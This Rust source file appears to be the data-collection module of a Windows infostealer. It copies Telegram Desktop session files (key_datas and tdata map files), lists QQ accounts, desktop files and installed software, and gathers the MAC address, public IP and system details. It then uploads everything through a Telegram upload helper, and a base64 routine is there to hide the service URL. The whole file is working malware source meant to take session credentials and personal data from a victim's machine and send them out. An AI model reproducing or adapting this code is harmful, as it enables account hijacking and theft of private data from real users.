use crate::api::*;
use crate::functions::tg_until::tg_tools;
use base64::{Engine, engine::general_purpose};
use chrono::{DateTime, Utc};
use std::time::UNIX_EPOCH;
use winreg::{RegKey, enums::*};
use std::io;
use directories::UserDirs;
use reqwest;
use std::{
    env,
    fs::{self},
    io::{Write},
    path::Path,
};
use sysinfo::{CpuExt, DiskExt, System, SystemExt};


pub fn qq_list() {

    let file_path = &format!("{}/qq_list.txt", OUTPUT_DIR.as_str());
    let mut file = match fs::OpenOptions::new()
        .append(true)
        .create(true)
        .open(&file_path)
    {
        Ok(f) => f,
        Err(e) => {
            eprintln!("无法打开文件 {}: {}", file_path, e);
            return;
        }
    };
    if let Some(user_dirs) = UserDirs::new() {
        if let Some(doc_dir) = user_dirs.document_dir() {
            println!("文档目录路径: {}", doc_dir.display());
            let qq_dir = doc_dir.join("Tencent Files");
            if let Ok(entries) = fs::read_dir(qq_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        let name = path.file_name().unwrap().to_str().unwrap();
                        println!("QQ 目录: {}", name);
                        writeln!(file, "QQ 目录: {}", name).unwrap();
                    }
                }
            } else {
                println!("无法读取 QQ 目录");
            }
        } else {
            println!("无法获取文档目录");
        }
    } else {
        println!("无法获取用户目录信息");
    }
}

pub fn tg_session() {

    let file_path = &format!("{}/tg_data", OUTPUT_DIR.as_str());
    let output_path = Path::new(file_path);
    if let Ok(appdata) = env::var("APPDATA") {
        let appdata_path = Path::new(&appdata);
        let tdata_path = appdata_path
            .join("Roaming")
            .join("Telegram Desktop")
            .join("tdata");
        println!("APPDATA 路径: {:?}", appdata_path);
        let key_datas = tdata_path.join("key_datas");
        let file1 = tdata_path.join("D877F783D5D3EF8Cs");
        let file2 = tdata_path.join("D877F783D5D3EF8C");
        // 复制文件到 output 目录
        if let Err(e) = fs::copy(&key_datas, output_path.join("key_datas")) {
            eprintln!("Failed to copy key_datas: {}", e);
        }

        if let Err(e) = fs::copy(&file1, output_path.join("D877F783D5D3EF8Cs")) {
            eprintln!("Failed to copy file1: {}", e);
        }

        if let Err(e) = fs::copy(&file2, output_path.join("D877F783D5D3EF8C")) {
            eprintln!("Failed to copy file2: {}", e);
        }
    } else {
        println!("无法获取 APPDATA 环境变量");
    }
}

pub async fn net_info() {

    let file_path = format!("{}/net_info.txt", OUTPUT_DIR.as_str());
    let mut file = match fs::OpenOptions::new()
        .append(true)
        .create(true)
        .open(&file_path)
    {
        Ok(f) => f,
        Err(e) => {
            eprintln!("无法打开文件 {}: {}", file_path, e);
            return;
        }
    };

    let mac_result = mac_address::get_mac_address();
    if let Ok(Some(mac)) = mac_result {
        println!("MAC address: {:?}", mac.to_string());
        writeln!(file, "MAC address: {:?}", mac.to_string()).unwrap();
    }

    // 获取公网 IP 信息
    match reqwest::Client::new().get("http://ipinfo.io").send().await {
        Ok(response) => match response.text().await {
            Ok(text) => {
                println!("{}", text);
                if let Err(e) = writeln!(file, "{}", text) {
                    eprintln!("写入公网 IP 信息失败: {}", e);
                }
            }
            Err(e) => eprintln!("解析响应失败: {}", e),
        },
        Err(e) => eprintln!("请求失败: {}", e),
    }
}

pub fn system_info() {
    let mut sys = System::new_all();
    sys.refresh_all();

    // 打印系统信息到控制台
    println!(
        "系统名称: {:?}",
        sys.name().unwrap_or_else(|| "未知".to_string())
    );
    println!(
        "系统版本: {:?}",
        sys.os_version().unwrap_or_else(|| "未知".to_string())
    );
    println!(
        "内核版本: {:?}",
        sys.kernel_version().unwrap_or_else(|| "未知".to_string())
    );
    println!("总内存: {} MB", sys.total_memory() / 1024);
    println!("可用内存: {} MB", sys.available_memory() / 1024);
    println!("CPU 核心数: {}", sys.cpus().len());

    for cpu in sys.cpus() {
        println!("CPU: {} - {:.2}%", cpu.name(), cpu.cpu_usage());
    }

    for disk in sys.disks() {
        println!(
            "磁盘: {:?}, 可用: {:.2} GB",
            disk.mount_point(),
            disk.available_space() as f64 / 1_000_000_000.0
        );
    }

    // 写入系统信息到文件
    let file_path = format!("{}/system_info.txt", OUTPUT_DIR.as_str());
    if let Err(e) = fs::create_dir_all(OUTPUT_DIR.as_str()) {
        eprintln!("无法创建输出目录: {}", e);
        return;
    }

    let mut file = match fs::OpenOptions::new()
        .append(true)
        .create(true)
        .open(&file_path)
    {
        Ok(f) => f,
        Err(e) => {
            eprintln!("无法打开文件 {}: {}", file_path, e);
            return;
        }
    };

    if let Err(e) = writeln!(
        file,
        "系统名称: {:?}",
        sys.name().unwrap_or_else(|| "未知".to_string())
    ) {
        eprintln!("写入系统名称失败: {}", e);
    }
    if let Err(e) = writeln!(
        file,
        "系统版本: {:?}",
        sys.os_version().unwrap_or_else(|| "未知".to_string())
    ) {
        eprintln!("写入系统版本失败: {}", e);
    }
    if let Err(e) = writeln!(
        file,
        "内核版本: {:?}",
        sys.kernel_version().unwrap_or_else(|| "未知".to_string())
    ) {
        eprintln!("写入内核版本失败: {}", e);
    }
    if let Err(e) = writeln!(file, "总内存: {} MB", sys.total_memory() / 1024) {
        eprintln!("写入总内存失败: {}", e);
    }
    if let Err(e) = writeln!(file, "可用内存: {} MB", sys.available_memory() / 1024) {
        eprintln!("写入可用内存失败: {}", e);
    }
    if let Err(e) = writeln!(file, "CPU 核心数: {}", sys.cpus().len()) {
        eprintln!("写入 CPU 核心数失败: {}", e);
    }

    for cpu in sys.cpus() {
        if let Err(e) = writeln!(file, "CPU: {} - {:.2}%", cpu.name(), cpu.cpu_usage()) {
            eprintln!("写入 CPU 信息失败: {}", e);
        }
    }

    for disk in sys.disks() {
        if let Err(e) = writeln!(
            file,
            "磁盘: {:?}, 可用: {:.2} GB",
            disk.mount_point(),
            disk.available_space() as f64 / 1_000_000_000.0
        ) {
            eprintln!("写入磁盘信息失败: {}", e);
        }
    }

    println!("系统信息已写入文件: {}", file_path);
}


#[derive(Debug)]
#[allow(dead_code)]
pub struct FileInfo {
    name: String,
    path: String,
    created: String,
    owner: String,
}

pub fn get_exe_list() -> Result<(), Box<dyn std::error::Error>> {
    // 64 位应用程序
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let paths = [
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
    ];

    for path in &paths {
        let uninstall = match hklm.open_subkey(path) {
            Ok(key) => key,
            Err(_) => continue,
        };

        for subkey_name in uninstall.enum_keys().flatten() {
            if let Ok(subkey) = uninstall.open_subkey(&subkey_name) {
                if let Ok(display_name) = subkey.get_value::<String, _>("DisplayName") {
                    let version: String = subkey
                        .get_value("DisplayVersion")
                        .unwrap_or("未知版本".into());
                
                    let file_path = format!("{}/exe_list.txt", OUTPUT_DIR.as_str()).to_string();
                    let mut file = fs::OpenOptions::new()
                        .append(true)
                        .create(true)
                        .open(file_path)
                        .unwrap();

                    writeln!(file, "{} - {}", display_name, version).unwrap();
                }
            }
        }
    }

    Ok(())
}

pub fn get_desktop_path() -> Option<String> {
    std::env::var("USERPROFILE")
        .ok()
        .map(|home| format!("{}\\Desktop", home)) // Windows 使用反斜杠
}

pub fn get_desk_file() -> Vec<FileInfo> {
    let mut file_list: Vec<FileInfo> = Vec::new();
    let deskpath = get_desktop_path().unwrap_or_else(|| {
        println!("Unable to get desktop path");
        String::new()
    });
    let paths = fs::read_dir(deskpath).unwrap();

    for path in paths {
        let path = path.unwrap().path();
        let name = path.file_name().unwrap().to_str().unwrap().to_string();

        // 获取文件创建时间
        let created = fs::metadata(&path).unwrap().created().unwrap();
        let created_duration = created.duration_since(UNIX_EPOCH).unwrap();
        let created_datetime: DateTime<Utc> = DateTime::from(UNIX_EPOCH + created_duration);
        let created = created_datetime.to_rfc3339();

        // 获取文件所有者信息
        // 这里简化处理，实际中可以通过特定操作系统的 API 获取文件所有者
        let owner = "Unknown".to_string(); // 获取文件所有者的实际方法依赖操作系统

        file_list.push(FileInfo {
            name,
            path: path.display().to_string(),
            created,
            owner,
        });
    }

    file_list
}

pub fn append_to_file(file_info: &FileInfo) -> io::Result<()> {
    let file_path = format!("{}/deskfile_info.txt", OUTPUT_DIR.as_str()).to_string();
    let mut file = fs::OpenOptions::new()
        .append(true)
        .create(true)
        .open(file_path)
        .unwrap();

    writeln!(file, "{:?}", file_info).unwrap();
    Ok(())
}

pub fn decoded_url(encodeurl: &str) -> String {
    // 这里使用运行时候的堆栈回溯可以找到服务url
    let decoded = general_purpose::STANDARD.decode(encodeurl).unwrap();
    String::from_utf8(decoded).unwrap()
}

pub async fn upload_directory(directory_path: &str) -> Result<(), reqwest::Error> {
    // 检查目录是否存在
    let dir = Path::new(directory_path);
    if !dir.exists() || !dir.is_dir() {
        eprintln!("目录不存在或不是有效目录: {}", directory_path);
        return Ok(());
    }

    // 遍历目录中的所有文件
    for entry in fs::read_dir(dir).unwrap_or_else(|_| {
        eprintln!("无法读取目录: {}", directory_path);
        std::fs::read_dir(".").unwrap() // 返回空的迭代器
    }) {
        if let Ok(entry) = entry {
            let path = entry.path();
            if path.is_file() {
                // 上传每个文件
                if let Err(e) = tg_tools::upload_file(&path.to_string_lossy()).await {
                    eprintln!("上传文件失败: {} - 错误: {}", path.display(), e);
                }
            }
        }
    }

    Ok(())
}


// 信息收集函数
pub async fn info_collect() {
    println!("trgger info_collect");
    let files = get_desk_file();
    for file in files {
        println!("{:?}", file);
        match append_to_file(&file) {
            Ok(_) => println!("File info appended successfully."),
            Err(e) => eprintln!("Error appending to file: {}", e),
        }
    }
    let _ = get_exe_list();
    let _ = system_info();
    let _ = net_info().await;
    let _ = tg_session();
    let _ = qq_list();


    let file_path = format!("{}", OUTPUT_DIR.as_str()).to_string();
    match upload_directory(&file_path).await {
        Ok(_) => {
            println!("File uploaded successfully.")
        }
        Err(e) => eprintln!("Error uploading file: {}", e),
    }
    // let _ = std::fs::remove_file(&file_path);
}